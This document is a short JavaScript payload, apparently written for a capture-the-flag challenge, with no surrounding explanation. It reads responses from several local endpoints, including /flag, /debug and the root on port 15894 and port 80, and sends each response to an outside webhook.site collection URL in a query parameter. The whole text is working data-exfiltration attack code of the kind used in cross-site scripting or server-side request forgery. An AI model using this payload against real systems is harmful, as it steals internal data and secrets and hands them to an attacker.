var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
fetch('http://127.0.0.1:15894/').then(r=>r.text()).then(t=>fetch(w+'/local?d='+encodeURIComponent(t)));
fetch('http://127.0.0.1:15894/flag').then(r=>r.text()).then(t=>fetch(w+'/lflag?d='+encodeURIComponent(t)));
fetch('http://127.0.0.1:15894/debug').then(r=>r.text()).then(t=>fetch(w+'/ldebug?d='+encodeURIComponent(t)));
fetch('http://127.0.0.1/').then(r=>r.text()).then(t=>fetch(w+'/l80?d='+encodeURIComponent(t)));
fetch('http://localhost:15894/').then(r=>r.text()).then(t=>fetch(w+'/llocal?d='+encodeURIComponent(t)));
